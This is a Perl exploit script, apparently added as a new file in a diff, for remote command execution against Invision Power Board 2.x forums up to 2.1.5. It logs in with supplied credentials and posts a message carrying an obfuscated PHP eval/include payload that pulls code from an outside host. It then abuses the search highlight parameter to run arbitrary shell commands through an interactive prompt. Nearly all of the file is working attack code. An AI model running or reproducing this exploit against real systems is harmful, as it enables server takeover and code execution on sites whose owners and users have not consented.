@@ -1,0 +1,194 @@
+#!/usr/bin/perl
+
+## Invision Power Board 2.* commands execution exploit by RST/GHC
+## vulnerable versions <= 2.1.5
+## tested on 2.1.4, 2.0.2
+##
+## (c)oded by 1dt.w0lf
+## RST/GHC
+## http://rst.void.ru
+## http://ghc.ru
+
+
+use IO::Socket;
+use Getopt::Std;
+
+getopts("l:h:p:d:f:v:");
+
+$host     = $opt_h;
+$dir      = $opt_d;
+$login    = $opt_l;
+$password = $opt_p;
+$forum    = $opt_f;
+$version  = $opt_v || 0;
+
+$|++;
+
+header();
+if(!$host||!$dir||!$login||!$password||!$forum) { usage(); }
+
+print "[~]    SERVER : $host\r\n";
+print "[~]      PATH : $dir\r\n";
+print "[~]     LOGIN : $login\r\n";
+print "[~]  PASSWORD : $password\r\n";
+print "[~]    TARGET : $version";
+print (($version)?(' - IPB 2.1.*'):(' - IPB 2.0.*'));
+print "\r\n";
+
+print "[~] Login ... ";
+
+$sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "80") || die "[-] CONNECTION FAILED";
+$login    =~ s/(.)/"%".uc(sprintf("%2.2x",ord($1)))/eg;
+$password =~ s/(.)/"%".uc(sprintf("%2.2x",ord($1)))/eg;
+$post     = 'UserName='.$login.'&PassWord='.$password;
+$loggedin = 0;
+print $sock "POST ${dir}index.php?act=Login&CODE=01 HTTP/1.1\r\n";
+print $sock "Host: $host\r\n";
+print $sock "Connection: close\r\n";
+print $sock "Content-Type: application/x-www-form-urlencoded\n";
+print $sock "Content-length: ".length($post)."\r\n\r\n";
+print $sock "$post";
+print $sock "\r\n\r\n";
+while (<$sock>)
+{  
+ if(/session_id=([a-f|0-9]{32})/) { $sid = $1; }
+}
+$sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "80") || die "[-] CONNECTION FAILED";
+print $sock "GET ${dir}index.php HTTP/1.1\r\n";
+print $sock "Host: $host\r\n";
+print $sock "Cookie: session_id=$sid;\r\n";
+print $sock "Connection: close\r\n\r\n";
+while (<$sock>)
+{    
+ if(/act=Login&amp;CODE=03/) { $loggedin = 1; last; }
+}
+if($loggedin) { print " [ DONE ]\r\n"; }
+else { print " [ FAILED ]\r\n"; exit(); }
+
+print "[+] SID: $sid\r\n";
+
+print "[~] Try get md5_check ...";
+$sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "80") || die "[-] CONNECTION FAILED";
+if($version==1)
+ {
+ print $sock "GET ${dir}index.php?act=post&do=new_post&f=${forum} HTTP/1.1\r\n";
+ }
+else
+ {
+ print $sock "GET ${dir}index.php?act=Post&CODE=00&f=${forum} HTTP/1.1\r\n";
+ }
+print $sock "Host: $host\r\n";
+print $sock "Cookie: session_id=$sid;\r\n";
+print $sock "Connection: close\r\n\r\n";
+while (<$sock>)
+ {  
+ if($version == 1 && /ipb_md5_check\s*= \"([a-f|0-9]{32})\"/)  { $md5_check = $1; last; }
+ if($version == 0 && /auth_key' value='([a-f|0-9]{32})/) { $md5_check = $1; last; }
+ }
+close($sock);
+if($md5_check) { print " [ DONE ]\r\n"; print "[+] MD5_CHECK : $md5_check\r\n"; }
+else { print " [ FAILED ]\r\n"; exit(); }
+
+print "[~] Create new message ...";
+$sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "80") || die "[-] CONNECTION FAILED";
+$created = 0;
+$text = 'r57ipbxplhohohoeval(include(chr(104).chr(116).chr(116).chr(112).chr(58).chr(47).chr(47).chr(114).chr(115).chr(116).chr(46).chr(118).chr(111).chr(105).chr(100).chr(46).chr(114).chr(117).chr(47).chr(114).chr(53)'.
+        '.chr(55).chr(105).chr(112).chr(98).chr(105).chr(110).chr(99).chr(46).chr(116).chr(120).chr(116))); //';
+$post = "st=0&act=Post&s=&f=${forum}&auth_key=${md5_check}&removeattachid=0&CODE=01&post_key=&TopicTitle=justxpl&TopicDesc=justxpl&poll_question=&ffont=0&fsize=0&Post=${text}&enableemo=yes&enablesig=yes&iconid=0";
+print $sock "POST ${dir}index.php HTTP/1.1\r\n";
+print $sock "Host: $host\r\n";
+print $sock "Cookie: session_id=$sid;\r\n";
+print $sock "Connection: close\r\n";
+print $sock "Content-Type: application/x-www-form-urlencoded\n";
+print $sock "Content-length: ".length($post)."\r\n\r\n";
+print $sock "$post";
+print $sock "\r\n\r\n";
+while (<$sock>)
+ {  
+ if(/Location:/) { $created = 1; last; }
+ }
+if($created) { print " [ DONE ]\r\n"; }
+else { print " [ FAILED ]\r\n"; exit(); }
+
+$sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "80") || die "[-] CONNECTION FAILED";
+print "[~] Search message ...";
+$post = 'keywords=r57ipbxplhohohoeval&namesearch='.$login.'&forums%5B%5D=all&searchsubs=1&prune=0&prune_type=newer&sort_key=last_post&sort_order=desc&search_in=posts&result_type=posts';
+print $sock "POST ${dir}index.php?act=Search&CODE=01 HTTP/1.1\r\n";
+print $sock "Host: $host\r\n";
+print $sock "Cookie: session_id=$sid;\r\n";
+print $sock "Connection: close\r\n";
+print $sock "Content-Type: application/x-www-form-urlencoded\n";
+print $sock "Content-length: ".length($post)."\r\n\r\n";
+print $sock "$post";
+print $sock "\r\n\r\n";
+
+while (<$sock>)
+ {
+ if(/searchid=([a-f|0-9]{32})/) { $searchid = $1; last; }
+ }
+
+if($searchid) { print " [ DONE ]\r\n"; }
+else { print "[ FAILED ]\r\n"; exit(); }
+print "[+] SEARCHID: $searchid\r\n";
+
+$get = 'index.php?act=Search&CODE=show&searchid='.$searchid.'&search_in=posts&result_type=posts&highlite=r57ipbxplhohohoeval&lastdate=z|eval.*?%20//)%23e%00';
+
+while ()
+ {
+    print "Command for execute or 'exit' for exit # ";
+    while(<STDIN>)
+     {
+        $cmd=$_;
+        chomp($cmd);
+        exit() if ($cmd eq 'exit');
+        last;
+     }
+    &run($cmd);
+ }
+
+sub run()
+ {
+  $cmd =~ s/(.*);$/$1/eg;
+  $cmd =~ s/(.)/"%".uc(sprintf("%2.2x",ord($1)))/eg;
+  $cmd2 = '%65%63%68%6F%20%5F%53%54%41%52%54%5F%20%26%26%20';
+  $cmd2 .= $cmd;
+  $cmd2 .= '%20%26%26%20%65%63%68%6F%20%5F%45%4E%44%5F';
+  $sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "80") || die "[-] CONNECTION FAILED";
+  
+  print $sock "GET ${dir}${get}&eharniy_ekibastos=$cmd2 HTTP/1.1\r\n";
+  print $sock "Host: $host\r\n";
+  print $sock "Cookie: session_id=$sid;\r\n";
+  print $sock "Connection: close\r\n\r\n";
+
+  $on = 0;
+  $runned = 0;
+  while ($answer = <$sock>)
+   {
+    if ($answer =~ /^_END_/) { return 0; }
+    if ($on == 1) { print "  $answer"; }
+    if ($answer =~ /^_START_/) { $on = 1; }
+   }
+ }
+ 
+sub header()
+ {
+ print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";   
+ print " Invision Power Board 2.* commands execution exploit by RST/GHC\r\n";
+ print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";
+ }
+ 
+sub usage()
+ {
+ print "r57ipbce.pl -h <host> -d <dir> -l <login> -p <password> -f <forum> -v <version>\r\n\r\n";
+ print "<host>     - host where IPB installed e.g www.ipb.com\r\n";
+ print "<dir>      - folder where IPB installed e.g. /forum/ , /ipb/ , etc...\r\n";
+ print "<login>    - login of any exist user\r\n";
+ print "<password> - and password too )\r\n";
+ print "<forum>    - number of forum where user can create topic e.g 2,4, etc\r\n";
+ print "<version>  - forum version:\r\n";
+ print "             0 - 2.0.*\r\n";
+ print "             1 - 2.1.*\r\n";
+ exit();
+ }
+
+# milw0rm.com [2006-04-26]
